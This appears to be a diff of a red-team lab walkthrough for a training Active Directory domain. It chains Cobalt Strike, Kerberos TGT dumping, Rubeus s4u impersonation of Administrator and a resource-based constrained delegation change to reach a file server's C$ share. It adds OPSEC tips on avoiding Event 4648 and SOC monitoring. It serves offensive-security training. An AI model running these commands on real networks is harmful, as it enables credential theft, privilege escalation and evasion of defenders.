@@ -8,7 +8,7 @@
 
 1. Launch Cobalt Strike and connect to the team server.  
 2. Interact with a Beacon and start a socks proxy. User `pchilds` beacon.  
-   `socks 1080 socks5 `  
+   `socks 1080 socks5`  
 3. From the Windows start menu, launch `Profixier`.  
 4. It opens minimised in the taskbar, so click it to open the full window.  
 
@@ -17,8 +17,8 @@
 >Add the team server as a new proxy server:  
     1. **Profile > Proxy Servers**  
     2. Click **Add**.  
-    3. Address of the Cobalt Strike server:  `10.0.0.5 `  
-    4. Port:  `1080 `  
+    3. Address of the Cobalt Strike server:  `10.0.0.5`  
+    4. Port:  `1080`  
     5. Protocol: **SOCKS Version 5**  
     6. Click **OK**.  
     
@@ -33,7 +33,7 @@
 >Add a new rule that will proxy any traffic from any application, on any port destined for the target network, through the team server.
     1. Click **Add**.
     2. Name:  `Beacon Network Route Rule`
-    3. Target hosts:  `10.10.120.0/23 `
+    3. Target hosts:  `10.10.120.0/23`
     4. Action: **Proxy SOCKS5 10.0.0.5**
     5. Click **OK**.
     6. Click **OK** again.
@@ -43,9 +43,9 @@
 1. Run Terminal as an **administrator**.
 2. Add static DNS records for `lon-dc-1` and `contoso.com` on attacker desktop to allow proxychain commands to resolve remote hostnames.
 
-	```PowerShell
-    Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
-    ```
+```PowerShell
+Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
+```
 
 ### Defender
 
@@ -68,13 +68,13 @@
 3. On the Attacker desktop, run a netonly process, that opens new PowerShell window.  
     `runas /netonly /user:CONTOSO\pchilds powershell`  
 
-    Enter fake password.
+* Enter any fake password.
     
 4. Request a service ticket for LDAP through the proxy, in the new **spawned** PowerShell window and paste the above returned based64 TGT ticket in the `Rubeus` command:  
 
-	```Terminal-nocolor
-    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
-    ```
+```Terminal-nocolor
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
+```
 
 >Setup done.  
 
@@ -95,86 +95,88 @@ Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' |
 
 3. Query LDAP to discover what this SID is if a user, computer or group, etc.
 
-    ```PowerShell
-    Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'
-    ```
+```PowerShell
+Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'
+```
 
 ⚠️ This will show that it's a domain group called "Server Admins", and that *rsteel* is a member.🔍
 
 4. Go back to Cobalt Strike and use the high-integrity Beacon running in 🔥SYSTEM beacon to dump 🗝️ the TGT for rsteel.
 
-    ```
-    krb_triage
-    ```
+```
+krb_triage
+```
     
-    > ⚠️ Lab-confirmed (2026-04-19): LUID varies per session — do NOT hardcode `/luid:244f58`. Always run `krb_triage` first to find the current rsteel LUID (e.g. `0x1e7efb` in this run).
+> ⚠️ Lab-confirmed (2026-04-19): LUID varies per session — do NOT hardcode `/luid:244f58`. Always run `krb_triage` first to find the current rsteel LUID (e.g. `0x1e7efb` in this run).
     
-    ```
-    krb_dump /luid:<rsteel-LUID-from-krb_triage> /service:krbtgt
-    ```
+```
+krb_dump /luid:<rsteel-LUID-from-krb_triage> /service:krbtgt
+```
     
     > OPSEC-🟠CAUTION — BOF, uses `LsaCallAuthenticationPackage` Kerberos API. No raw LSASS read.
     > ⚠️ Use `/luid:1e7efb` NOT `/luid:0x1e7efb` — Kerbeus-BOF rejects 0x prefix ("Invalid luid").
     
 5. Before using the above output base64 ticket for `rsteal` we need to purge `pchilds`. In the netonly process on the Attacker Desktop, purge LDAP ticket for pchilds.
-    
-    ```PowerShell
-    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge
-    ```
+
+```PowerShell
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge
+```
 
 6. Request a new LDAP service ticket with `rsteel` TGT, and paste in rsteel TGT base64 ticket given us LDAP tgt ticket.
 
-	```PowerShell
-	C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT_RSTEEL] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
-    ```
+```PowerShell
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT_RSTEEL] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
+```
 
 ===
 
-## Exploitation
+## RBCD Exploitation
 
 1. Sanity check for any existing RBCD configurations.
 
-    ```PowerShell
-    Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
-    ```
+>From Attacker Desktop, running proxifier, execute in powershell where PowerView module imported:  
+```PowerShell
+Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
+```
 
-⚠️ Lab-confirmed (2026-04-19): LON-FS-1 already has LON-WS-1 as an existing RBCD delegate. **Do NOT overwrite** — add alongside the existing entry (see step 2).
+⚠️ LON-FS-1 already has LON-WS-1 as an existing RBCD delegate. **Do NOT overwrite** — add alongside the existing entry (see step 2).
 
 2. Add a new RBCD config between *lon-fs-1* and *lon-wkstn-1*, making sure not to overwrite the existing entry.❗
 
-    ```PowerShell
-    $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
-    $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
-    Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'
-    ```
+```PowerShell
+$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
+$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
+Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'
+```
 
 > ⚠️ Critical: pass **both** `$ws1,$wkstn1` to preserve the existing LON-WS-1 entry. Using only `$wkstn1` would remove LON-WS-1. Lab-confirmed result: `LON-FS-1: {LON-WS-1, LON-WKSTN-1}`.
 
-3. Verify that both `lon-ws-1` and `lon-wkstn-1` are present.
+3. Still on Attacker Desktop, in powershell, Verify that both `lon-ws-1` and `lon-wkstn-1` are present.
   
-    ```PowerShell
-    Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
-    Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
-    ```
+```PowerShell
+Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
+Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
+```
 
-4. Go back to Cobalt Strike again, and dump 🗝️  TGT for *lon-wkstn-1* from high integrity 🔥system user beacon to enable exploitation using workstation tgt.  
+4. Go back to Cobalt Strike beacon, and dump 🗝️  TGT for *lon-wkstn-1* from high integrity 🔥system user beacon to enable exploitation using workstation tgt.  
 
-    ```
-    krb_dump /luid:3e7 /service:krbtgt
-    ```
+```
+krb_dump /luid:3e7 /service:krbtgt
+```
     
-    > OPSEC-🟠CAUTION — BOF, Kerberos API. Requires 🔥SYSTEM context. `/luid:3e7` = machine account session — always present on domain-joined host.
-    > ⚠️ NO 0x prefix — `/luid:0x3e7` = "Invalid luid" error (Kerbeus-BOF lab-confirmed).  
+> OPSEC-🟠CAUTION — BOF, Kerberos API. Requires 🔥SYSTEM context. `/luid:3e7` = machine account session — always present on domain-joined host.  
+> ⚠️ NO 0x prefix — `/luid:0x3e7` = "Invalid luid" error (Kerbeus-BOF lab-confirmed).  
     
-5. Use above base64 TGT ticket copied to clipboard. Request a usable service ticket for *cifs/lon-fs-1*, impersonating the default domain administrator.
+5. Back in Powershell session on Attacker Desktop, Use above raw base64 TGT ticket output, copy to clipboard.  
+>Request a usable service ticket for *cifs/lon-fs-1*, impersonating the default domain administrator.  
   
-    ```PowerShell-nocolor
-    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
-    ```
+```PowerShell-nocolor
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
+```
 
+> OPSEC-🟢SAFE — Rubeus runs on the attacker desktop, not via beacon, files written locally only to Attacker desktop.  
+**Attacker desktop is not monitored by SOC blue team.**  
 
-> OPSEC-🟢SAFE — Rubeus runs on the attacker desktop (not via beacon), files written locally only. Attacker desktop is not monitored by SOC blue team.
-> 
 > ⚠️ Rubeus `/outfile` with a **directory path** auto-names the files:
 > - S4U2self ticket: `_Administrator_to_LON-WKSTN-1$@CONTOSO.COM`
 > - S4U2proxy cifs ticket: `_cifs_lon-fs-1`
@@ -185,18 +187,13 @@ Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' |
 
 6. Use the ticket file output to attacker desktop to list the C$ share content on `lon-fs-1`.
 
-    ```cs
-    // Option A — skip make_token (OPSEC-🟢SAFE — no Event 4648, lab-confirmed working)
-    kerberos_ticket_use C:\Users\Attacker\Desktop\_cifs_lon-fs-1
-    ls \\lon-fs-1\c$
+```cs
+// skip make_token (OPSEC-🟢SAFE — no Event 4648, lab-confirmed working)
+kerberos_ticket_use C:\Users\Attacker\Desktop\_cifs_lon-fs-1
+ls \\lon-fs-1\c$
+```
 
-    // Option B — with make_token (OPSEC-🟠CAUTION — Event 4648, cleaner session)
-    make_token CONTOSO\Administrator FakePass
-    kerberos_ticket_use C:\Users\Attacker\Desktop\_cifs_lon-fs-1
-    ls \\lon-fs-1\c$
-    ```
-
-> ⚠️ Lab-confirmed 🔥 make_token was **not run** and `ls \\lon-fs-1\c$` succeeded. The remote server validates the Kerberos ticket content, not the local session identity — `kerberos_ticket_use` injects the ticket into the current beacon logon session directly.
+> ⚠️ 🔥 make_token was **not needed** and `ls \\lon-fs-1\c$` succeeded. The remote server validates the Kerberos ticket content, not the local session identity — `kerberos_ticket_use` injects the ticket into the current beacon logon session directly.
 
 Cleanup — revoke token and purge ticket:
 
@@ -207,24 +204,9 @@ kerberos_ticket_purge
     
 7. On the Attacker Desktop, restore the RBCD configuration back to how it was.
 
-    ```PowerShell
-    Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1'
-    Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
-    ```
+```PowerShell
+Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1'
+Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
+```
 
 ⚠️ In this lab, you have learned how to leverage a `WriteProperty` primitive with RBCD to compromise a computer.
-
-===
-
-## Lab Observations (2026-04-19)
-
-| Finding | Detail |
-|---------|--------|
-| `make_token` not required | `kerberos_ticket_use _cifs_lon-fs-1` succeeded without `make_token`. Remote server validates Kerberos ticket content, not local session identity. Skipping avoids Event 4648. |
-| Rubeus s4u output filename | `/outfile:C:\Users\Attacker\Desktop\` (directory) auto-names files: S4U2self = `_Administrator_to_LON-WKSTN-1$@CONTOSO.COM`, S4U2proxy = `_cifs_lon-fs-1`. Use exact path from Rubeus output. |
-| LUID varies per session | Lab doc shows `/luid:244f58` but actual was `/luid:1e7efb`. Always run `krb_triage` first — never hardcode LUID. |
-| Existing RBCD must be preserved | LON-FS-1 already had LON-WS-1. Set both: `$ws1,$wkstn1` — using only one overwrites and removes the other. |
-| WriteProperty principal | SID `...1107` = "Server Admins" group. Member: Robert Steel (rsteel). Controls: LON-WS-1, LON-FS-1, LON-DB-1, LON-DB-2, LON-CS-1. |
-| krb_dump luid format | `/luid:3e7` and `/luid:1e7efb` — NO 0x prefix. Kerbeus-BOF rejects 0x prefix. |
-| krb_tgtdeleg for pchilds | Used from medium-integrity pchilds beacon — no SYSTEM required. Provides forwardable TGT for proxy-based LDAP queries. |
-| Rubeus purge before re-using pchilds session | Must purge pchilds ldap ticket before importing rsteel ldap ticket — otherwise two tickets conflict in the same session. |
